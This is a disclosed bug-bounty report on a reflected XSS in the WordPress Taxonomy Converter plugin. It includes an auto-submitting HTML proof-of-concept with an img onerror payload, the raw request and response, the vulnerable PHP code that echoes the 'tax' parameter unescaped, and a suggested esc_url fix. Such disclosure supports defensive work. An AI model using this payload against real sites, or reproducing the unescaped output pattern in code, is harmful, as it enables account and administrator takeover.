# Reflected XSS: Taxonomy Converter via tax parameter

## Report Details
- **Report ID**: 495515
- **URL**: https://hackerone.com/reports/495515
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-02-13T20:02:37.577Z
- **Disclosed**: 2019-08-28T15:33:16.538Z

## Reporter
- **Username**: foobar7
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wordpress

## Vulnerability Information
CVSS
----

Medium 6.1 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

Description
-----------

The [Taxonomy Converter](https://wordpress.org/plugins/taxonomy-converter/) that is listed on the [Official WordPress plugins](https://profiles.wordpress.org/wordpressdotorg/#content-plugins) page is vulnerable to reflected XSS as it echoes the `tax` parameter without encoding. 

POC
----

    <html>
      <body>
        <form action="http://192.168.0.104/wordpress5/wordpress/wp-admin/admin.php?import=wptaxconvert&tax=categoryx'&quot;><img+src%3dx+onerror%3dalert(1)>&step=2" method="POST" enctype="text/plain">
          <input type="hidden" name="test" value="test&#13;&#10;" />
          <input type="submit" value="Submit request" />
        </form>
        <script>
          document.forms[0].submit();
        </script>
      </body>
    </html>

Request
--------

    POST /wordpress5/wordpress/wp-admin/admin.php?import=wptaxconvert&tax=categoryx'"><img+src%3dx+onerror%3dalert(1)>&step=2 HTTP/1.1
    Host: 192.168.0.104
    [...]

    test=test

    HTTP/1.1 200 OK
    [...]

	<p>Uh, oh. Something didn&#8217;t work. Please <a href="admin.php?import=wptaxconvert&amp;tax=categoryx\'\"><img src=x onerror=alert(1)>">try again</a>.</p>

Code
----

    /wp-content/plugins/taxonomy-converter/taxonomy-converter.php

	function process($tax) {
		global $wpdb;

		if ( (!isset($_POST['terms_to_convert']) || !is_array($_POST['terms_to_convert'])) && empty($this->terms_to_convert) || (!isset($_POST['taxes'])) ) { ?>
			<div class="narrow">
			<p><?php printf(__('Uh, oh. Something didn&#8217;t work. Please <a href="%s">try again</a>.', 'wptaxconvert'), 'admin.php?import=wptaxconvert&amp;tax='.$tax); ?></p>
			</div>
    <?php		return;
		}

Solution
--------

Apply `esc_url` or similar to `$tax` before passing it to `printf`.

## Impact

With a successful attack, an attacker can access all data the attacked user has access to, as well as perform arbitrary requests in the name of the attacked user.

If the attacked user is an administrator, the attacker could for example create a new admin user and thus gain full control of the application (and depending on the settings, the server).

## Attachments
No attachments
